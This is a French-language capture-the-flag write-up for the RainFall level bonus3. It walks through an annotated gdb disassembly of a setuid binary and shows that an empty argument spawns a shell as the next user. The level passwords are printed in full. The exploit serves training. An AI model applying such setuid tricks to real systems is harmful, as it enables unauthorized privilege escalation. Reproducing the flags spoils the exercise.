## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le bonus2
  $ ssh bonus3@127.0.0.1 -p 4242
     _____       _       ______    _ _
    |  __ \     (_)     |  ____|  | | |
    | |__) |__ _ _ _ __ | |__ __ _| | |
    |  _  /  _` | | '_ \|  __/ _` | | |
    | | \ \ (_| | | | | | | | (_| | | |
    |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                  Good luck & Have fun

    To start, ssh with level0/level0 on 10.0.2.15:4242
  bonus3@127.0.0.1's password 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
  [...]
  bonus3@RainFall:~$
  
  # On regarde ce qu'on a
  bonus1@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 bonus3 bonus3   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 bonus3 bonus3  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 bonus3 bonus3 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3
    -rw-r--r--+ 1 bonus3 bonus3   65 Sep 23  2015 .pass
    -rw-r--r--  1 bonus3 bonus3  675 Apr  3  2012 .profile

  # On teste les arguments
  bonus3@RainFall:~$ ./bonus3
  bonus3@RainFall:~$ ./bonus3 test

  bonus3@RainFall:~$ ./bonus3 test test
  bonus3@RainFall:~$ ./bonus3 test test test
  bonus3@RainFall:~$ ./bonus3 testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

  bonus3@RainFall:~$ ./bonus3 testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

  ```
  * Pas de résultat si on a argc != 2
  * Print un retour a la ligne avec un input, même très long


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    bonus3@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    bonus3@RainFall:/tmp$ gdb ~/bonus3
      [...]
      Reading symbols from /home/user/bonus3/bonus3...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info functions
    All defined functions:

    Non-debugging symbols:
    0x0804836c  _init
    0x080483b0  strcmp
    0x080483b0  strcmp@plt
    0x080483c0  fclose
    0x080483c0  fclose@plt
    0x080483d0  fread
    0x080483d0  fread@plt
    0x080483e0  puts
    0x080483e0  puts@plt
    0x080483f0  __gmon_start__
    0x080483f0  __gmon_start__@plt
    0x08048400  __libc_start_main
    0x08048400  __libc_start_main@plt
    0x08048410  fopen
    0x08048410  fopen@plt
    0x08048420  execl
    0x08048420  execl@plt
    0x08048430  atoi
    0x08048430  atoi@plt
    0x08048440  _start
    0x08048470  __do_global_dtors_aux
    0x080484d0  frame_dummy # Fonctions habituelles
    0x080484f4  main        # Fonctions habituelles
    0x08048620  __libc_csu_init
    0x08048690  __libc_csu_fini
    0x08048692  __i686.get_pc_thunk.bx
    0x080486a0  __do_global_ctors_aux
    0x080486cc  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x80486f0
      0x80486f0:	 "r"

    gdb-peda$ x/s 0x80486f2
      0x80486f2:	 "/home/user/end/.pass"
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Initialisation, sauve edi/ebx (ca va boucler!), alignement et allocation de 160
      0x080484f4 <+0>:	push   ebp
      0x080484f5 <+1>:	mov    ebp,esp
      0x080484f7 <+3>:	push   edi
      0x080484f8 <+4>:	push   ebx
      0x080484f9 <+5>:	and    esp,0xfffffff0
      0x080484fc <+8>:	sub    esp,0xa0

      # ESP + 156 = fd = fopen("/home/user/end/.pass", "r")
      0x08048502 <+14>:	mov    edx,0x80486f0
      0x08048507 <+19>:	mov    eax,0x80486f2
      0x0804850c <+24>:	mov    DWORD PTR [esp+0x4],edx
      0x08048510 <+28>:	mov    DWORD PTR [esp],eax
      0x08048513 <+31>:	call   0x8048410 <fopen@plt>
      0x08048518 <+36>:	mov    DWORD PTR [esp+0x9c],eax

      # Call memset(buffer1[128], 0, 132) car 0x9c - 0x18 = 128
      # On fait une sorte de bzero du buffer1
      0x0804851f <+43>:	lea    ebx,[esp+0x18]
      0x08048523 <+47>:	mov    eax,0x0
      0x08048528 <+52>:	mov    edx,0x21
      0x0804852d <+57>:	mov    edi,ebx
      0x0804852f <+59>:	mov    ecx,edx
      0x08048531 <+61>:	rep stos DWORD PTR es:[edi],eax

      # Si fd == 0 (fopen n'a pas marché) jump main+79
      0x08048533 <+63>:	cmp    DWORD PTR [esp+0x9c],0x0
      0x0804853b <+71>:	je     0x8048543 <main+79>

      # Si argc == 2 jump main+89
      0x0804853d <+73>:	cmp    DWORD PTR [ebp+0x8],0x2
      0x08048541 <+77>:	je     0x804854d <main+89>

      # Si !fd or argc != 2 return -1
      0x08048543 <+79>:	mov    eax,0xffffffff
      0x08048548 <+84>:	jmp    0x8048615 <main+289>

      # Eax = fread(buffer1, 1, 66, fd)
      0x0804854d <+89>:	lea    eax,[esp+0x18]
      0x08048551 <+93>:	mov    edx,DWORD PTR [esp+0x9c]
      0x08048558 <+100>:	mov    DWORD PTR [esp+0xc],edx
      0x0804855c <+104>:	mov    DWORD PTR [esp+0x8],0x42
      0x08048564 <+112>:	mov    DWORD PTR [esp+0x4],0x1
      0x0804856c <+120>:	mov    DWORD PTR [esp],eax
      0x0804856f <+123>:	call   0x80483d0 <fread@plt>

      # buffer1[65] = \0
      0x08048574 <+128>:	mov    BYTE PTR [esp+0x59],0x0

      # EAX = atoi(argv[1])
      0x08048579 <+133>:	mov    eax,DWORD PTR [ebp+0xc]
      0x0804857c <+136>:	add    eax,0x4
      0x0804857f <+139>:	mov    eax,DWORD PTR [eax]
      0x08048581 <+141>:	mov    DWORD PTR [esp],eax
      0x08048584 <+144>:	call   0x8048430 <atoi@plt>

      # ESP[atoi(argv[1]) + 24] = 0
      0x08048589 <+149>:	mov    BYTE PTR [esp+eax*1+0x18],0x0

      # Call fread(buffer2, 1, 65, fd)
      # On écrit le contenu du fichier password dans un 2eme buffer
      0x0804858e <+154>:	lea    eax,[esp+0x18]
      0x08048592 <+158>:	lea    edx,[eax+0x42]
      0x08048595 <+161>:	mov    eax,DWORD PTR [esp+0x9c]
      0x0804859c <+168>:	mov    DWORD PTR [esp+0xc],eax
      0x080485a0 <+172>:	mov    DWORD PTR [esp+0x8],0x41
      0x080485a8 <+180>:	mov    DWORD PTR [esp+0x4],0x1
      0x080485b0 <+188>:	mov    DWORD PTR [esp],edx
      0x080485b3 <+191>:	call   0x80483d0 <fread@plt>

      # Call fclose(fd)
      0x080485b8 <+196>:	mov    eax,DWORD PTR [esp+0x9c]
      0x080485bf <+203>:	mov    DWORD PTR [esp],eax
      0x080485c2 <+206>:	call   0x80483c0 <fclose@plt>

      # Call strcmp(buffer1, argv[1])
      0x080485c7 <+211>:	mov    eax,DWORD PTR [ebp+0xc]
      0x080485ca <+214>:	add    eax,0x4
      0x080485cd <+217>:	mov    eax,DWORD PTR [eax]
      0x080485cf <+219>:	mov    DWORD PTR [esp+0x4],eax
      0x080485d3 <+223>:	lea    eax,[esp+0x18]
      0x080485d7 <+227>:	mov    DWORD PTR [esp],eax
      0x080485da <+230>:	call   0x80483b0 <strcmp@plt>

      # Si buffer1 == argv[1] jump a main+269
      0x080485df <+235>:	test   eax,eax
      0x080485e1 <+237>:	jne    0x8048601 <main+269>

      # return execl("/bin/sh", "sh", NULL)
      0x080485e3 <+239>:	mov    DWORD PTR [esp+0x8],0x0
      0x080485eb <+247>:	mov    DWORD PTR [esp+0x4],0x8048707
      0x080485f3 <+255>:	mov    DWORD PTR [esp],0x804870a
      0x080485fa <+262>:	call   0x8048420 <execl@plt>
      0x080485ff <+267>:	jmp    0x8048610 <main+284>

      # Ici buffer1 != argv[1]
      # Call puts(buffer2) puis return 0
      0x08048601 <+269>:	lea    eax,[esp+0x18]
      0x08048605 <+273>:	add    eax,0x42
      0x08048608 <+276>:	mov    DWORD PTR [esp],eax
      0x0804860b <+279>:	call   0x80483e0 <puts@plt>
      0x08048610 <+284>:	mov    eax,0x0

      # Return
      0x08048615 <+289>:	lea    esp,[ebp-0x8]
      0x08048618 <+292>:	pop    ebx
      0x08048619 <+293>:	pop    edi
      0x0804861a <+294>:	pop    ebp
      0x0804861b <+295>:	ret
      End of assembler dump.
  ```
## 2: Comportement
  * Notre programme prend donc 1 paramètre et soit print le password soit lance un shell

## 3: Exploit

### A: Explication

> Après analyse, on se rend compte que le programme lit dans le fichier que l'on veut, et sous certaines contitions, le print.\
> Sous d'autres conditions, il lance un shell. Et nous on aime les shell.\
> Pour celui-ci, on voit que le programme met un "\0" à l'addresse du buffer + la valeur retournée par le atoi(argv[1])


### B: Creation de l'exploit

```
  bonus3@RainFall:/tmp$ ~/bonus3 ""
  $ whoami
    end
  $ cat /home/user/end/.pass
    3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
  bonus3@RainFall:/tmp$ su end
    Password: 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
  end@RainFall:~$ cat end
    Congratulations graduate!
```